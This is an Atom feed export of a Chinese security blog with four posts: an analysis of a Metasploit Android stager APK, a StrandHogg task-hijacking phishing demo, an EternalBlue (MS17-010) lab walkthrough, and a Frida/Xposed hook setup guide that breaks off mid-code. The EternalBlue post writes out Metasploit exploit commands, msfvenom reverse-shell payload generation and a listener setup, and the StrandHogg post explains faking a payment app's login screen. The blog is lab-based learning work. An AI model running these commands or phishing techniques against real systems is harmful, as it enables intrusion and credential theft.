<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clicker&#39;s blogs</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-01T09:29:15.434Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>clicker</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>com.metasploit.stage分析</title>
    <link href="http://yoursite.com/2020/07/01/com-metasploit-stage%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/07/01/com-metasploit-stage%E5%88%86%E6%9E%90/</id>
    <published>2020-07-01T09:23:10.000Z</published>
    <updated>2020-07-01T09:29:15.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="com-metasploit-stage分析"><a href="#com-metasploit-stage分析" class="headerlink" title="com.metasploit.stage分析"></a>com.metasploit.stage分析</h1><p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p>先分析客户端（移动设备上apk），再分析msf端的原理，透彻理解服务端控制客户端的原理。</p><h2 id="1-反编译"><a href="#1-反编译" class="headerlink" title="1.反编译"></a>1.反编译</h2><p>首先，反编译生成的apk文件。将apk文件拖入jeb工具中，可以看到此apk的主要类结构。从Manifest文件可以看出，应用入口为MainActivity，设置了<code>android:theme</code>为<code>“@android:style/Theme.NoDisplay”</code>，即不显示。定义了一个MainBroadcastReceiver，接收设备已启动广播。在Mainservice中执行主要操作。</p><p><img src="image-20200630154246007.png" alt=""></p><h2 id="2-调用入口"><a href="#2-调用入口" class="headerlink" title="2.调用入口"></a>2.调用入口</h2><p>在MainActivity和MainBroadcastReceiver中的onCreate和onReceive方法中均调用了<code>MainService.startService</code>。看一下MainService的代码：</p><p><img src="image-20200630161204397.png" alt=""></p><p>在startService()方法中，启动了MainService服务，会调用onStartCommand方法，传入Context参数。onStartCommand方法中，调用了关键类<code>Payload</code>的start方法。看一下代码：</p><p><img src="image-20200630161730343.png" alt=""></p><p>注意，方法中调用了<code>startInPath</code>方法，并传入了Context.getFilesDir().toString。getFilesDir()方法用于获取/data/data/<application package>/files目录，即应用的私有目录。Payload.a是一个byte[]静态常量，和应用私有目录一起初始化了Payload.h。</p><p>然后，进入类e。该类代码如下:</p><p><img src="image-20200630162622935.png" alt=""></p><p>可以看到只是新起了一个线程来执行Payload.main()方法。</p><h2 id="3-Payload类"><a href="#3-Payload类" class="headerlink" title="3.Payload类"></a>3.Payload类</h2><h3 id="3-1-main"><a href="#3-1-main" class="headerlink" title="3.1 main()"></a>3.1 main()</h3><p>回到Payload类，main方法：</p><p><img src="image-20200630163037019.png" alt=""></p><p>传进来的参数的null,执行<code>a v6 = b.a(Payload.a);</code>，即对byte[]常量Payload.a进行一系列位运算（怀疑是某种加密算法），返回类a的实例。</p><h3 id="3-2-关键代码"><a href="#3-2-关键代码" class="headerlink" title="3.2 关键代码"></a>3.2 关键代码</h3><p>关键代码如下，即对Payload.a解析出的数据进行一系列操作：</p><p><img src="image-20200630174353882.png" alt=""></p><p>在while循环中，对String类型的变量v7进行判断。v7来自g对象的String变量a，而g对象来自Payload.a解析后生成的a类型的对象中的LinkedList类型变量d的第0个元素。</p><p>v7判断处有两个分支：以“tcp”开头和以“https”开头。</p><p>若以“tcp”开头，则对v7进行格式化，根据格式化的代码：</p><p><img src="image-20200630172642154.png" alt=""></p><p>可以看出，v7的格式为：<code>tcp://ip:port</code>. v3_1即为ip, v2_1即为端口号。然后，建立Socket连接，如下图：</p><p><img src="image-20200630172930068.png" alt=""></p><p>若以“https”开头，则调用类a的a()方法解析请求，代码如下：</p><p><img src="image-20200630173204517.png" alt=""></p><p>然后，调用类f的a()方法,初始化SSLSocket连接:</p><p><img src="image-20200630173801701.png" alt=""></p><h3 id="3-3-Paload-a"><a href="#3-3-Paload-a" class="headerlink" title="3.3 Paload.a()"></a>3.3 Paload.a()</h3><p> 建立Socket或SSLSocket连接后，调用了Payload.a()方法传输文件：</p><p><img src="image-20200630175301744.png" alt=""></p><p>首先，从远程下载jar文件到本地，然后，加载该文件，再通过反射调用start()方法。</p><h3 id="3-4-分析远程下载的文件"><a href="#3-4-分析远程下载的文件" class="headerlink" title="3.4 分析远程下载的文件"></a>3.4 分析远程下载的文件</h3><p>从上图可以看到，调用DexClassLoader.loadClass()方法，执行动态加载，随即删除了从远程下载的文件。为了查看从远程下载的文件内容是什么，需要修改文件，重新打包此应用。找到Payload.smali文件中对应的delete语句，将其删除即可，如下图：</p><p><img src="image-20200701140248112.png" alt=""></p><p>重新打包签名（PS：签名一完成，windows自带的扫描工具就扫描出了病毒。。。。），安装，执行，在/data/data/com.metasploit.stage/files目录下，找到了下载的文件：</p><p><img src="image-20200701142807469.png" alt=""></p><p>反编译jar包，可以得到：</p><p><img src="image-20200701150116368.png" alt=""></p><p>可以看到，这里的方法就是Payload类中通过反射调用的start()方法。start()方法通过读取数据流，以及加载dex文件，就可以执行远程指令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;com-metasploit-stage分析&quot;&gt;&lt;a href=&quot;#com-metasploit-stage分析&quot; class=&quot;headerlink&quot; title=&quot;com.metasploit.stage分析&quot;&gt;&lt;/a&gt;com.metasploit.stage
      
    
    </summary>
    
    
      <category term="工具配置笔记" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>StrandHogg漏洞分析笔记-copy</title>
    <link href="http://yoursite.com/2020/03/26/StrandHogg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-copy/"/>
    <id>http://yoursite.com/2020/03/26/StrandHogg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-copy/</id>
    <published>2020-03-26T09:21:53.000Z</published>
    <updated>2020-03-26T09:49:16.028Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p><img src="t01fc7d99b17a8596c0.png" alt=""></p><p>又是一个神不知鬼不觉盗取用户隐私信息的漏洞，用户实惨。。。</p><p>StrangHogg漏洞是一个存在于Android多任务系统中的应用漏洞。攻击者通过设置AndroidManifest.xml文件中组件的android:taskAffinity属性即可利用此漏洞进行钓鱼等攻击。 当用户点击受害应用时，可直接弹出恶意应用界面， 伪装成另一个应用欺骗用户的重要账号密码，申请读取短信、联系人等权限，从而获取隐私信息。并且，此漏洞更加隐蔽的地方在于，即使用户查看后台应用也不会发现此时有两个看起来一样的应用在运行，危害极大！</p><p><img src="2019121212104067758.jpg" alt=""></p><p><img src="2019121212105243270.jpg" alt=""></p><p>了解StrandHogg漏洞的原理，关键在 android:taskAffinity属性 。那么，首先就需要了解下Activity栈（Task，也可以叫做任务）。</p><p>Activity栈是一种管理Activity界面的结构，遵循“后进先出”规则。位于栈顶的Activity获取屏幕的焦点，当按下“back”按钮时，栈顶Activity弹出，前一个Activity重新获取焦点。</p><p>一般情况下，同一个应用程序中启动的Activity位于一个栈中，多个应用程序同时运行时，查看后台应用，可以看到多个任务栈。官方提供了 <code>android:taskAffinity</code> 这一属性，使得不同应用的Activity也可以进入同一个栈（Task）中。官方翻译为“ 从概念上讲，具有同一相似性的 Activity 归属同一Task（从用户的角度来看，则是归属同一“应用”） ”。每个Activity都有taskAffinity属性，指明它启动时进入的Task。若没有显式指定，就遵循其所在的Application标签中的该属性。若Application标签中也没指定，taskAffinity属性值就是包名。</p><p>如果想要单独给某个Activity设定一个任务栈，就需要设置<code>TaskAffinity</code>属性。除此之外，还需将Activity的启动模式即<code>android:lunchMode</code>属性设置为<code>singleTop</code>,或是启动Activity时设置<code>FLAG_ACTIVITY_NEW_TASK</code>。</p><p>StrandHogg漏洞涉及到的另一个属性是android:allowTaskReparenting。官方解释为： 当下一次将启动 Activity 的任务转至前台时，Activity 是否能从该任务转移至与其有相似性的任务 —“<code>true</code>”表示可以转移，“<code>false</code>”表示仍须留在启动它的任务处。 读起来相当拗口。在这里，当恶意应用设置了android:taskAffinity属性值为受害应用的taskAffinity值（大多为包名），然后将 android:allowTaskReparenting属性设置为true，那么，先点击恶意应用，再启动受害应用时，跳出来的就是恶意应用的界面。事实上，受害应用的Activity也启动了，只不过恶意应用瞬间就重新寄宿到受害应用的Task中，导致受害应用的界面被覆盖掉。</p><p><strong>案例：</strong>下面视频以某宝为例演示钓鱼实验过程</p><p><img src="test1.gif" alt=""></p><p>步骤为：点击恶意应用（某宝1）-&gt; 点击返回键 -&gt; 点击受害应用（某宝）。可以看到登录页面被无缝覆盖。仔细观察也能发现钓鱼页面与原页面不同，不过要是一门心思使坏，也能做到页面、图标与受害应用一模一样。</p><p>查看后台应用，也只有一个应用：</p><p><img src="Screenshot_20191219-173012.png" alt=""></p><p>打开山寨应用，查看当前Activity栈信息，发现其TaskRecorder是“com.eg.android.AlipayGphone”，即受害应用包名。</p><p><img src="D83B603F-FCBB-4ede-856E-977D02779A84.png" alt=""></p><p>攻击成功时，Activity栈信息，如下图：</p><p><img src="1867749D-BDED-49d0-AA15-58BAFA26E4AF.png" alt=""></p><p>实际场景中，攻击成功是需要条件的。android:allowTaskReparenting属性和 android:taskAffinity属性是将恶意应用的某Activity与受害应用的Activity关联，使其启动时进入同一个Task。因此，攻击并不是每次都能成功，必须是恶意应用先启动，然后再启动受害应用。<br>另一个需要克服的问题是，必须保证恶意应用进程一直在后台运行，而不被杀死。</p><p>对我来说，实验中耗费时间最长的就是制作钓鱼页面了。。。页面布局是个大坑啊。不过若只是想假冒应用获取敏感权限，就不需要会费心思制作输入框了，截个图就行了。（当然只是实验环境，胆小如我并没有找别人测试。）</p><p>这个功能是系统提供的，即使被用作钓鱼，也不会被手机自带的杀毒软件识别出来。再加上某些非手机自带“安全”APP的特点，对于没有安全基础的广大Android用户来说，可能唯一的方法就是不安装来源不明的软件了。</p><p>今天看到工信部公布了第一批侵害用户权益的APP名单，希望我们广大Android用户的使用体验能越来越好吧~</p><p>参考文献：<br>（1） <a href="https://developer.android.com/guide/topics/manifest/activity-element" target="_blank" rel="noopener">https://developer.android.com/guide/topics/manifest/activity-element</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;t01fc7d99b17a8596c0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;又是一个神
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝实验笔记-copy</title>
    <link href="http://yoursite.com/2020/03/26/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0-copy/"/>
    <id>http://yoursite.com/2020/03/26/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0-copy/</id>
    <published>2020-03-26T09:13:01.000Z</published>
    <updated>2020-03-26T09:35:18.466Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p>先放上参考链接：<br>（1） <a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/9473</a><br>（2） <a href="https://www.youtube.com/watch?v=jrql8dJoEH0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jrql8dJoEH0</a><br>（3） <a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a></p><p>本次实验的目标一共四个：win7 , win xp , win server 2003, win server 2012.<br>实验环境是kali, 工具是metasploit.</p><p>第一步，扫描目标ip端，可以使用goby(<a href="https://gobies.org/#dl)，或nmap。Windows环境下可以使用goby，可以扫出漏洞信息，但是不好分辨目标操作系统版本。goby对win10用户很不友好，所以选择了在kali中使用nmap。直接执行`nmap" target="_blank" rel="noopener">https://gobies.org/#dl)，或nmap。Windows环境下可以使用goby，可以扫出漏洞信息，但是不好分辨目标操作系统版本。goby对win10用户很不友好，所以选择了在kali中使用nmap。直接执行`nmap</a> 192.168.27.0-145 -O`即可扫描该ip段的设备操作系统信息，稍等一会扫描结束才会显示结果，着急的人也可以折磨Enter键来查看进度。聪明的小伙伴这时候就选择了界面版nmap，而不是像本人一样，努力瞪大眼睛在黑漆漆的背景下搜寻那几个渺小的字母。。。（emmm其实可以使用终端的搜索直接定位windows关键字的）</p><p>定位到目标IP和对应的操作系统后就可以开始实验了。</p><p>第二步，打开在终端输入<code>msfconsole</code>,进入msf。<br>输入<code>search ms17-010</code>，所搜可利用模块。</p><p>以下介绍不同版本操作系统的利用方法。</p><h3 id="1-win-7"><a href="#1-win-7" class="headerlink" title="1. win 7"></a>1. win 7</h3><p>执行以下命令即可获取Guest用户的shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.27.107exploit</span><br></pre></td></tr></table></figure><h3 id="2-win-xp-和win-server-2003"><a href="#2-win-xp-和win-server-2003" class="headerlink" title="2. win xp 和win server 2003"></a>2. win xp 和win server 2003</h3><p>这两个的利用方法一样，就放在一起吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset rhost 192.168.27.227exploit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexecset rhost 192.168.27.227exploit</span><br></pre></td></tr></table></figure><h3 id="3-win-server-2012"><a href="#3-win-server-2012" class="headerlink" title="3. win server 2012"></a>3. win server 2012</h3><p>参考文章开头的<a href="https://www.youtube.com/watch?v=jrql8dJoEH0" target="_blank" rel="noopener">视频教程</a>,先<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">下载exploit包</a>。</p><p>根据视频中的内容，首先需要安装nasm编译工具（这里不再详细说了），再将下载的exploit包解压，使用nasm工具编译其中的eternalblue_kshellcode_x64.asm文件。再使用msfvenom工具生成木马程序，在目标主机上执行。即可在本地监听通信。</p><p>以下为主要步骤：</p><p>(1) 切换至exploit包的<code>shellcode</code>目录；<br>(2）<code>nasm -f bin eternalblue_kshellcode_x64.asm</code> ，可以看到生成了eternalblue_kshellcode_x64文件；<br>(3) <code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_msf.bin EXITFUNC=thread LHOST=192.168.27.241 LPORT=4444</code>，可以看到生产了meterpreter_msf.bin文件（LHOST为本地主机ip）；<br>(4)<code>cat eternalblue_kshellcode_x64 meterpreter_msf.bin &gt; meterpreter.bin</code><br>(5) 将<code>meterpreter.bin</code>文件复制到上一层目录；<br>(6)切换至上一层目录，即exploit包的根目录，执行<code>gedit eternalblue_eploit8.py</code>, 将USERNAME改为’Gusest’，并保存；</p><p>(7) 另起一个终端，进入<code>msfconsole</code><br>(8) <code>use exploit/multi/handler</code><br>(9) <code>set payload windows/x64/meterpreter/reverse_tcp</code><br>(10) <code>set lhost 192.168.27.241</code><br>(11) <code>set lport 4444</code><br>(12) <code>exploit</code>，开启监听</p><p>（13）回到刚才的终端，执行脚本，将exploit和木马程序meterpreter.bin发送至目标主机：<br><code>python eternalblue_exploit8.py 192.168.27.67 meterpreter.bin</code></p><p>顺利的话，这里就应该能看到msf监听到的通信建立过程了，然而，执行完最后一个命令msf终端毫无反应。没有什么是一帆风顺的，这正是时间的常理。</p><p>经过老大的提示，在命令后加个500就可以了！果然！成功了！Yeah!</p><p>那这个500是啥呢，经过一番搜索发现， 它是一个安全标识符(SID)，是标识用户、组和计算机账户的唯一号码。两次创建统一名称的账户，分配给它的SID是不同的。通常情况下SID是唯一的，很多值都是固定的，比如500代表管理员账号Administrator，501代表Guest账号。</p><p>emmm不过当时没有注意是guest账户还是Administrator账户，下次可以看下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先放上参考链接：&lt;br&gt;（1） &lt;a href=&quot;https://github.com/rapid7/meta
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Hook框架配置备忘录-copy</title>
    <link href="http://yoursite.com/2020/03/26/Hook%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98%E5%BD%95-copy/"/>
    <id>http://yoursite.com/2020/03/26/Hook%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98%E5%BD%95-copy/</id>
    <published>2020-03-26T08:35:46.000Z</published>
    <updated>2020-03-26T09:10:58.318Z</updated>
    
    <content type="html"><![CDATA[<p>Java层Hook工具，应用较多的有Xposed和Friday；so层Hook工具常用Substrate。</p><p><strong>Frida：</strong></p><p>动态插桩工具，使用Python、JavaScript共同完成。主要hook逻辑在JavaScript中完成，Python脚本负责将JS脚本传递给Android系统中的frida-server。</p><p>frida需要在root环境下执行，在移动端安装frida-server服务，并将设备连接至服务端。服务端需配置Linux环境和SDK PlatformTools，配置adb和fastboot环境变量。</p><p>与Xposed相比，Frida更改hook程序后无需重启系统，可直接重写方法体。Frida还可以hookNative层函数。</p><p><strong>Xposed:</strong></p><p>主要用于监控APP行为,改变原程序逻辑，沙箱定制（主要关注反环境检测）；</p><p>hook重载方法时，可忽略参数，使用hookAllMethods()，对于多个构造方法的hook，可使用hookAllConstructors()方法。</p><p>由于dalvik环境下xposed对multidex的支持没有很好的通用解决方案，寻找目标函数会发生ClassNotFoundError，所以处理multidex需要一些技巧（Tips）: 此问题因为classloader出错引起的，所以要寻找attachBaseContext 的classloader，而非lpparam.classLoader（此思路来自非虫前辈）。</p><h2 id="Frida配置"><a href="#Frida配置" class="headerlink" title="Frida配置"></a>Frida配置</h2><p>这里介绍Android中Frida的环境配置。分为服务端和客户端两个部分。</p><h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1-1-客户端配置"><a href="#1-1-客户端配置" class="headerlink" title="1.1 客户端配置"></a>1.1 客户端配置</h4><p>客户端的配置是在PC端，需要首先安装Python环境，配置pip模块。然后，执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fridapip install frida-tools</span><br></pre></td></tr></table></figure><p>然后执行<code>pip list</code>查看是否安装成功。</p><p><img src="frida1.PNG" alt=""></p><h4 id="1-2-服务端配置"><a href="#1-2-服务端配置" class="headerlink" title="1.2 服务端配置"></a>1.2 服务端配置</h4><p>服务端配置是在Android端。</p><p>首先，查看测试机的CPU架构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><p>结果显示：</p><p><img src="arm64.PNG" alt=""></p><p>即为ARM64.</p><p>然后，在<a href="https://github.com/frida/frida/releases下载与客户端frida**对应版本**、与测试机**架构相同**的frida-server压缩包。注意：服务端frida-server版本与客户端frida版本必须相同才能正常运行。" target="_blank" rel="noopener">https://github.com/frida/frida/releases下载与客户端frida**对应版本**、与测试机**架构相同**的frida-server压缩包。注意：服务端frida-server版本与客户端frida版本必须相同才能正常运行。</a></p><p>下载之后，解压，并将解压得到的文件传入测试机/data/local/tmp目录下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server &#x2F;data&#x2F;local&#x2F;tmp *# adb push 参数1 参数2*</span><br><span class="line">adb shell cd data&#x2F;local&#x2F;tmp </span><br><span class="line">chmod 777 frida-server</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>最好使用真机，模拟器会因为架构兼容模式从而使得程序报错。</p><p>执行frida-servcer: <code>**./freda-server**</code></p><p>另起一个终端，配置端口转发： <code>adb forward tcp:27043 tcp:27043</code></p><p>执行<strong>frida-ps -U</strong>测试是否启动成功，如图：</p><p><img src="frida2.PNG" alt=""></p><p>至此，frida环境配置和启动完成。</p><h3 id="二、模块编写"><a href="#二、模块编写" class="headerlink" title="二、模块编写"></a>二、模块编写</h3><p>可以使用JS或Python编写hook脚本，示例可以参考官方文档<a href="https://frida.re/docs/examples/android/。具体编写示例会在后续博客中详述。" target="_blank" rel="noopener">https://frida.re/docs/examples/android/。具体编写示例会在后续博客中详述。</a></p><p>若使用JS hook，只需执行： <code>frida -U -f hookpackagename -l test.js --no-pause</code>。</p><p>若使用Python，则直接执行<code>python3 test.py</code>即可。</p><h2 id="Xposed-Hook配置"><a href="#Xposed-Hook配置" class="headerlink" title="Xposed Hook配置"></a><strong>Xposed Hook</strong>配置</h2><h3 id="一、Xposed安装"><a href="#一、Xposed安装" class="headerlink" title="一、Xposed安装"></a>一、Xposed安装</h3><h4 id="1-1-模拟器"><a href="#1-1-模拟器" class="headerlink" title="1.1 模拟器"></a>1.1 模拟器</h4><p>模拟器采用网易MuMu，Android版本号6.0.1</p><h4 id="1-2-Xposed安装包下载"><a href="#1-2-Xposed安装包下载" class="headerlink" title="1.2 Xposed安装包下载"></a>1.2 Xposed安装包下载</h4><p><strong>下载地址：</strong><a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">https://forum.xda-developers.com/showthread.php?t=3034811</a></p><p><strong>下载如下图所示安装包：</strong></p><p><img src="ejhasa7c7AAJLRpS__thumbnail.PNG" alt=""></p><h4 id="1-3-安装"><a href="#1-3-安装" class="headerlink" title="1.3 安装"></a>1.3 安装</h4><p>直接把安装包拖入到MuMu模拟器中即可。  </p><h4 id="1-4-激活Xposed框架"><a href="#1-4-激活Xposed框架" class="headerlink" title="1.4 激活Xposed框架"></a>1.4 激活Xposed框架</h4><p><strong>1.4.1 关闭应用兼容性</strong></p><p>Xposed激活需要关闭MuMu设置中的应用兼容性，操作步骤如下：</p><p>打开设置，找到应用兼容性，关闭按钮，使其处于灰色状态</p><p><img src="gOGuQXlDPnQkiQxt__thumbnail.PNG" alt=""></p><p><img src="Wf44dfz8sKM3sYxW__thumbnail.PNG" alt=""></p><p><strong>1.4.2 激活Xposed框架</strong></p><p>打开“Xposed Installer”应用，点击下图表识先进行下载。</p><p><img src="ZAgsXfQrvsMsoyke__thumbnail.PNG" alt=""></p><p>下载完成会跳出如下界面，如没有跳出，请再点击一下</p><p><img src="qJi8xKL32jsnH5Ta__thumbnail.PNG" alt=""></p><p><strong>1.4.3 重新开启应用兼容性</strong></p><p>重新开启“应用兼容性”，使模拟器能同时运行x86软件和arm软件。</p><p><strong>步骤一：</strong>打开设置，找到应用兼容性</p><p><strong>步骤二：</strong>点击按钮，使其处于绿色状态，即开启状态</p><h3 id="二、Xposed模块编写"><a href="#二、Xposed模块编写" class="headerlink" title="二、Xposed模块编写"></a>二、Xposed模块编写</h3><h4 id="2-1-配置AndroidManifest-xml"><a href="#2-1-配置AndroidManifest-xml" class="headerlink" title="2.1 配置AndroidManifest.xml"></a>2.1 配置AndroidManifest.xml</h4><ol><li>使用Android Studio新建一个Android工程</li><li>然后在AndroidManifest.xml中插入如下代码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data </span><br><span class="line">android:name&#x3D;&quot;xposedmodule&quot; </span><br><span class="line">android:value&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta-data </span><br><span class="line">android:name&#x3D;&quot;xposeddescription&quot; </span><br><span class="line">android:value&#x3D;&quot;这是一个Xposed例程&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta-data </span><br><span class="line">android:name&#x3D;&quot;xposedminversion&quot; </span><br><span class="line">android:value&#x3D;&quot;54&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p><img src="manifest.PNG" alt=""></p><h4 id="2-2-配置build-gradle"><a href="#2-2-配置build-gradle" class="headerlink" title="2.2 配置build.gradle"></a>2.2 配置build.gradle</h4><p>在build.gradle中添加如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repositories &#123; jcenter()&#125;</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compileOnly &#39;de.robv.android.xposed:api:82&#39;compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;</span><br></pre></td></tr></table></figure><p>这句代码是告诉AndroidStuido使用jcenter作为代码仓库，从这个仓库里远程寻找 de.robv.android.xposed:api:82 这个API。这个网上很少有Xposed教程介绍它的！（我们不用自己找XposedBridgeApi.jar了。注意！此处要用compileOnly这个修饰符！网上有些写的是provide ，现在已经停用了！）</p><p>插入位置如下图，</p><p><img src="gradle.PNG" alt=""></p><h4 id="2-3-Hook-实践"><a href="#2-3-Hook-实践" class="headerlink" title="2.3 Hook 实践"></a>2.3 Hook 实践</h4><p><strong>2.3.1 创建Button</strong></p><p>创建一个Button控件，用于测试Hook</p><p>在MainActivity中写入如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String TAG = <span class="string">"Tag"</span>;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        button = findViewById(R.id.button);</span><br><span class="line"></span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, toastMessage(), Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="comment">//getContacts();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toastMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我未被劫持"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.3.2 测试为hook代码</strong></p><p>测试代码，运行后点击Button控件</p><p><strong>2.3.3 hook代码编写</strong></p><p>在MainActivity的同级路径下新建一个类“HookTest.java”，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 